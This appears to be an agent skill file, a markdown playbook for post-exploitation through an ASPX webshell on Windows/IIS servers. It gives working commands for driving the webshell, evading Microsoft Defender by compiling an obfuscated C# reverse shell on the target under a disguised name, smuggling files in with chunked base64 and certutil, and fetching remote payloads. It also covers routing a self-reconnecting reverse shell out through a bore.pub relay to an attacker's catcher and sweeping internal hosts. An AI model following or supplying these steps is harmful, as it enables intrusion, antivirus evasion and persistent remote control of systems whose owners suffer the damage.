---
name: windows-webshell-postexp
description: Use when driving an ASPX webshell on IIS for post-ex work.
version: 1.0.0
author: hermes-curator
license: MIT
metadata:
  hermes:
    tags: [webshell, iis, defender-evasion, reverse-shell, tunneling, post-exploitation]
    related_skills: [ssh-pentesting, windows-privilege-escalation, seimpersonate]
tags: [webshell, iis, defender-evasion, reverse-shell, tunneling]
---

# Windows/IIS Webshell Post-Exploitation

## When to Use

- A working ASPX command webshell is accessible on a Windows/IIS target (`?k=SECRET&c=<cmd>` pattern, `[OK]...[ERR]` output wrapper).
- You need an interactive shell, tooling on the box, or privesc staging from that foothold.
- Defender/AV is blocking known tool binaries and you need a transfer or evasion path.

Assumes the webshell form above; adapt paths/ports per target.

## 1. Verify state first (cheap, one call each)

```bash
W='http://host:port/path/p.aspx?k=SECRET&c='
curl -s -m 20 "${W}whoami /priv"        # SeImpersonate? SeDebug? -> privesc path
curl -s -m 20 "${W}netstat -ano"        # listeners + PIDs -> map internal apps
curl -s -m 20 "${W}tasklist /fi \"PID eq <pid>\""
curl -s -m 20 "${W}cmd /c dir <webroot>"   # confirm writable webroot
```

Always read the webshell source from disk (`cmd /c type <shell>.aspx`) — older shells may lack stderr redirect or POST-body support; redeploy an improved one via the transfer method below.

## 2. Defender is on (default) — do NOT ship known binaries

Real-time AV kills uploaded GodPotato/nc.exe/mimikatz within seconds (`Get-MpThreatDetection` confirms what got flagged). Files may vanish between `dir` calls.

**Working approach: compile on target with the trusted Microsoft compiler.**

1. Write C# locally, obfuscate the sensitive strings (target host/ports as `char[]` int arrays, avoid `cmd.exe` literals where possible).
2. Transfer the `.cs` (not `.exe`) — source files are not flagged.
3. Compile with the framework's csc:
   ```
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:F:\path\svchostupd.exe F:\path\rs.cs
   ```
4. Run it. A self-compiled simple TCP reverse shell survived where GodPotato was quarantined on sight.

Keep a loop+reconnect shell (retry every 5s) so a dropped tunnel self-heals.

## 3. File transfer without a working upload endpoint

Multipart upload to the webshell often fails (`Request.Files` not wired). Reliable path is **certutil + chunked base64 via cmd echo**:

```bash
B64=$(base64 -w0 local_file)
n=1
for chunk in $(echo "$B64" | fold -w 900); do
  OP=">"; [ $n -gt 1 ] && OP=">>"
  curl -s -m 30 "${W}cmd+/c+echo+$chunk+$OP+C%3A%5Ctmp%5Cf.b64" > /dev/null
  n=$((n+1))
done
curl -s -m 40 "${W}cmd+/c+certutil+-f+-decode+C%3A%5Ctmp%5Cf.b64+C%3A%5Ctmp%5Cf.ext"
```

- IIS query-string limits truncate long `c=` values (~1500 chars) — chunks of 900 are safe.
- Verify transfer with `dir` size / `certutil -hashfile` vs local md5. A partial/mangled file silently fails decode (`ERROR_INVALID_DATA` = byte drift between chunks; re-append the missing tail chunk).
- Outbound HTTPS is usually allowed even when direct connects are blocked: `certutil -urlcache -f https://... C:\dest` pulls straight from GitHub releases (fast path for anything AV won't eat).

## Support files

- `scripts/catcher.py` — single-connection reverse-shell catcher for bore relays (run in background, drive via `/proc/<pid>/fd/0`).
- `templates/revshell_rs.cs` — Defender-clean C# reverse shell (host as char-array), compiles with target's `csc.exe`.

## 4. Reverse shell egress through bore

```bash
# attacker: relay + single-connection catcher
~/Desktop/bore local 40000 --to bore.pub --port 40000   # background
python3 catcher.py                                       # listens 0.0.0.0:40000, accepts ONE conn
# target: start the compiled exe (pointed at bore.pub)
cmd /c start /b F:\path\svchostupd.exe
```

**Pitfall — bore pairs connections; do NOT use `socat ... EXEC:'bash',pty,fork`.** With fork, *every* inbound client (including your own test connects) gets its own fresh local bash, so your interactive client and the implant never meet each other. Use a dedicated Python catcher that accepts one connection and drives it from stdin lines; send commands by writing to the catcher process's stdin (`echo "cmd" > /proc/<catcher_pid>/fd/0`) and read output by polling the background process.

## 5. PowerShell invocation quirks through cmd-based shells

- `powershell -enc <b64>` via GET query works up to ~1500 base64 chars; longer scripts get truncated mid-arg and powershell prints its usage banner. For long scripts: shorten the script, or write the `.ps1` via the chunked method (ASCII base64 of the ps1, certutil decode, `powershell -File`).
- ASCII-b64 of the `.ps1` file is simpler and more reliable than UTF-16 `-enc` round-trips through echo/certutil.
- `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}` replaces PS7 `-SkipCertificateCheck` on Windows PowerShell 5.1.
- When a PS one-liner's quoting fight gets ugly (nested quotes through URL-encode through cmd), stop and ship a `.ps1` file instead.

## 6. Identifying which backend a public vhost really hits

Public DNS often points many hosts at one NAT IP. From inside, resolve the mapping:

- Test `http://127.0.0.1/` and other local listeners **with the target Host header** — 404/500 vs the expected app tells you the app is NOT on this box.
- Raw-probe LAN neighbors from the ARP table with a TCP-connect sweep (use `ConnectAsync(...).Wait(ms)`; `Invoke-WebRequest` hides which hop failed) and match `Server:` headers (nginx vs IIS) plus response fingerprints against the public endpoint.
- Read what you can without admin: `C:\inetpub\wwwroot` listings, `web.config` files in readable roots. `appcmd` needs an elevated token (appool identity gets `redirection.config` permission errors).

## Pitfalls

- `net use \\127.0.0.1\IPC$ /user:...` from a webshell process fails with error 1312 — the IIS logon session can't create network credentials that way; use PowerShell/C# API calls instead.
- Certutil `-hashfile` on an AV-flagged file returns `ERROR_VIRUS_INFECTED (0x800700e1)` — that error is itself confirmation Defender flagged the file.
- A copied system binary (e.g. `whoami.exe`) still runs from the webroot: "The system cannot execute the specified program" on YOUR uploaded exe means AV, not execution policy — re-test with a copied system binary to confirm execution isn't blocked globally.
